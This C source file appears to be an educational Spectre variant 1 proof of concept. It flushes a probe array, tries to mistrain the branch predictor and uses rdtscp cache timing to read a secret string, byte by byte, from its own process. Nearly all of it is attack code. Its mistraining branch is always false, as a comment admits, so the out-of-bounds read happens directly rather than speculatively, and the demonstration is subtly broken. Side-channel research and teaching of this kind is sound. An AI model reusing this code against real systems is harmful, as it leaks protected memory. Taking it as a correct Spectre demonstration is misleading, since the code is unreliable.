#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <x86intrin.h>

#define CACHE_HIT_THRESHOLD 80  // It can be changeable according to the OS, Hardware and System
#define ARRAY_SIZE 256
#define PAGE_SIZE 4096 // It can be changeable according to the OS, Hardware and System

unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[16] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
uint8_t unused2[64];
uint8_t array2[256 * 4096];//ARRAY_SIZE * PAGE_SIZE

char *secret = "Zeus, Hades, Poseidon, Ra, Isis, Set, Odin, Thor, Loki";

/*
void flush_side_channel():

We go through every item in array2 and put a value in it. 
This makes certain that the memory pages supporting array2 are loaded into real memory. 
This stage is super important because if the pages are not loaded, 
accessing them later could cause a page mistake, which would mess up our timing measurements.

We use the _mm_clflush function to flush each cache line that corresponds to an entry in array2. 
This function make sure that the specified memory address is removed from all levels of the cache. 
The next time the CPU access this address, it will need to fetch the data from the main memory, 
which takes more time and let us measure the access time accurately.
*/
void flush_side_channel() {
    int i;
    
    for (i = 0; i < ARRAY_SIZE; ++i) 
        array2[i * PAGE_SIZE] = 1;
    
    for (i = 0; i < ARRAY_SIZE; ++i) 
        _mm_clflush(&array2[i * PAGE_SIZE]);
}

// Function to measure access time
int read_memory_byte(size_t malicious_x, uint8_t value[2], int score[2]) {
    static int results[ARRAY_SIZE];
    int tries, i, j, k, mix_i, junk = 0;
    size_t training_x, x;
    uint64_t time1, time2;
    volatile uint8_t *addr;

    //we have to ensure that results is empty
    for (i = 0; i < ARRAY_SIZE; ++i) 
        results[i] = 0; 

    // it is 999 times because we want to make sure that the result is correct
    for (tries = 999; tries > 0; --tries) { 
        
        // Flush array2 from cache
        flush_side_channel();

        
        training_x = tries % array1_size;
        // 31 loops to train the branch predictor
        for (j = 30; j >= 0; j--) {

            _mm_clflush(&array1_size);
            //Loop for delay to stop out-of-order execution from making problem.
            for (volatile int z = 0; z < 100; z++) {} 
            
            // Mistrain the branch predictor
            if (((j % 6) - 1) & 0) { //Always False Because Bitwise-And  0
                x = training_x;
            } else {
                x = malicious_x;
            }

            // Access the array speculatively
            *(volatile uint8_t *)(&array2[array1[x] * PAGE_SIZE]);
        }

        // Time the accesses to array2
        for (i = 0; i < ARRAY_SIZE; i++) {
            //Mix i to avoid accessing sequential cache lines.
            mix_i = ((i * 167) + 13) & 255; 

            //Calculate the address to be accessed.
            addr = &array2[mix_i * PAGE_SIZE];

            //Read Time Stamp Counter Before and After the Memory Access
            time1 = __rdtscp(&junk); 
            junk = *addr;
            time2 = __rdtscp(&junk) - time1;

            // ( is it in cache             )&&(  mix_i is not the same as the training index, it is a cache hit.)
            if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size]) {
                results[mix_i]++; //the hit counter
            }
        }

        // Initialize best guess indices.
        j = -1;
        k = -1;
        for (i = 0; i < ARRAY_SIZE; i++) {
            if (j < 0 || results[i] >= results[j]) {
                k = j;
                j = i;
            } else if (k < 0 || results[i] >= results[k]) {
                k = i;
            }
        }
        //  If the best guess is better than the second best, stop trying.
        if (results[j] >= (2 * results[k] + 5) && results[j] >= 2) 
            break;
    }
    // XOR a dummy value to prevent compiler optimization issues.
    results[0] ^= junk; 

    value[0] = (uint8_t)j;
    score[0] = results[j];

    value[1] = (uint8_t)k;
    score[1] = results[k];

    // best guess is reliable ?
    return (results[j] >= (2 * results[k] + 5) && results[j] >= 2);
}

int main() {
    // Calculate malicious index here is the problem
    size_t malicious_x = (size_t)(secret - (char *)array1);
    printf("secret: %d\n", (size_t)(secret - (char *)array1));
    int score[2], len = strlen(secret);
    uint8_t value[2];
    int i;

    printf("Reading %d bytes:\n", len);
    while (--len >= 0) {
        printf("Reading at %p... ", (void *)malicious_x);
        if (read_memory_byte(malicious_x++, value, score)) {
            printf("Successfully read:");
        } else {
            printf("Failed to read:");
        }

        printf("0x%02X='%c' score=%d ", value[0], (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);//Eliminate non-printable characters
        if (score[1] > 0) {
            printf("\n\t\t\t(second best: 0x%02X='%c' score=%d)", value[1], (value[1] > 31 && value[1] < 127 ? value[1] : '?'), score[1]);//Eliminate non-printable characters
        }
        printf("\n");
    }
    return 0;
}

